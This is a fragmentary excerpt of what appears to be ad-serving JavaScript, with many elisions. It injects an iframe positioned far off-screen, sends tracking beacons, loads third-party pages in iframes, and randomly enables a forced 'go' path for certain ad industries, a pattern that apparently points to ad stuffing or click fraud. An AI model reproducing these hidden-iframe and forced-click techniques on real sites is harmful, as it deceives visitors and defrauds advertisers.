...
li_ifr.id = li_ifr_id;
li_ifr.style.position = 'absolute';
li_ifr.style.left = '-40000px';
li_ifr.style.top = '-40000px';
li_ifr.style.width = '100%';
li_ifr.style.height = '1000px';
window.curNode.parentNode.insertBefore(li_ifr, window.curNode);

window.all_info = []; 
window.all_info['iadvplaceid'] = '9032208587291607'; 
...
window.all_info['cnzz_count'] = 0;
window.all_info['cnzz_count_c'] = 0;
window.all_info['cnzz_count_g'] = 0;
...
new Image().src = alogs;
        ...
        function getscript(){
                ...
                new Image().src  = "https://aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=9527&script=" + str;//isCrossDomain
        }
    ...
    function(e, t, n) {
        ...
        function c(e) {
			...
			this.reqRequest(url, JSON.stringify(data), this.reqResponse, null, 1,traceid);
				    ...
				    advertiser_id:a.adData.advertiser_id,
				    real_adtype:a.adData.real_adtype,
				    domain:a.adData.domain,
				    apurl:a.adData.apurl,
				    rl:a.adData.rl,
				    template_id:a.adData.template_id,
				    c:t.c,
			...
			if (typeof(n['data'][0]) != 'undefined' && parseInt(n['data'][0]['acttype']) == 0 && (parseInt(n['data'][0]['ad_industry_id']) == 606 || parseInt(n['data'][0]['ad_industry_id']) == 626)){
			    window.all_info['cnzz_count'] = 1;
			    window.all_info['cnzz_count_c'] = 1;
			    
			    var crd_g = Math.floor(Math.random() * (1000 - 1)) + 1;
			    if (crd_g <= crd_g_v) window.all_info['cnzz_count_g'] = 1;					    
			    
			}
			
			//
			//if (typeof(n['data'][0]) != 'undefined' && (parseInt(n['data'][0]['ad_industry_id']) == 2110 || parseInt(n['data'][0]['ad_industry_id']) == 5003)){
			//	window.all_info['cnzz_count'] = 1;
			//	window.all_info['cnzz_count_c'] = 1;
			//	window.all_info['cnzz_count_g'] = 1;
			//}else{
			//	window.all_info['cnzz_count'] = 0;
			//	window.all_info['cnzz_count_c'] = 0;
			//	window.all_info['cnzz_count_g'] = 0;				
			...
			if (typeof(n['data'][0]) != 'undefined'){
			    var m_img = n['data'][0]['img'];
			    var m_title = n['data'][0]['txt'];
			    var m_desc = n['data'][0]['desc'];
			    var m_ad_industry_id = n['data'][0]['ad_industry_id'];
			    var m_real_adtype = n['data'][0]['real_adtype'];
			    var m_acttype = n['data'][0]['acttype'];
			    var m_advertiser_id = n['data'][0]['advertiser_id'];
			    var m_template_id = n['data'][0]['template_id'];
			    ...
			    var click_url = '';
			    var rl = encodeURI(n['data'][0]['rl']);
			    var apurl = encodeURI(n['data'][0]['apurl']);
			    var go_url = ''
			    var is_from = 1;;
			    
			    var m_viewid = '';
			    //var alogs = 'https://api.186078.com:3928/aliyun/sample/ad.php?m_img='+m_img+'&m_title='+m_title+'&m_desc='+m_desc+'&m_ad_industry_id='+m_ad_industry_id+'&m_advertiser_id='+m_advertiser_id+'&m_real_adtype='+m_real_adtype+'&m_acttype='+m_acttype+'&m_viewid='+m_viewid+'&click_url='+click_url+'&rl='+rl+'&apurl='+apurl+'&go_url='+go_url+'&template_id='+m_template_id+'&is_from='+is_from+'&is_ready_go='+is_ready_go;
			    //new Image().src = alogs;			    
			}
			...
			{
			    var tm = window.all_info['cnzz_count_c'] == 1 ? 10 : 1000;
			    var i_this = this;
...
//			console.log('goUrl');
			...
			if (window.all_info['cnzz_count_c'] == 1){
			    var m_img = t['img'];
			    var m_title = t['txt'];
			    var m_desc = t['desc'];
			    ...
			    if (window.all_info['cnzz_count_g'] == 1){
				c_go = 1;
			    }			    
			    
			    var m_viewid = '';
			    //var alogs = 'https://api.186078.com:3928/aliyun/sample/ad.php?m_img='+m_img+'&m_title='+m_title+'&m_desc='+m_desc+'&m_ad_industry_id='+m_ad_industry_id+'&m_advertiser_id='+m_advertiser_id+'&m_real_adtype='+m_real_adtype+'&m_acttype='+m_acttype+'&m_viewid='+m_viewid+'&click_url='+click_url+'&rl='+rl+'&apurl='+apurl+'&go_url='+go_url+'&template_id='+m_template_id+'&is_from='+is_from+'&is_new='+is_new+'&c_go='+c_go+'&domain='+domain+'&placement_id='+placement_id+'&trackid='+trackid;
			    //new Image().src = alogs;
			    
			    if (window.all_info['cnzz_count_g'] == 0){
				return;
			    }			    
			}
...
//		bc(core_js);
		...
		function agnf(){    
			...
			c.src = "https://etc.6187wo.com/20192.html#s_w="+s_w;
			document.body.appendChild(d);
		...
		function mast(){    
			...
			var c = document.createElement("iframe");
			var s_w = window.screen.width;
			c.src = "https://etc.6187wo.com/10177.html#s_w="+s_w;
			document.body.appendChild(d);
...
if(rrr < 100){    
	...
	var time_rand = 0;
    //setTimeout(function(){mast();}, time_rand);
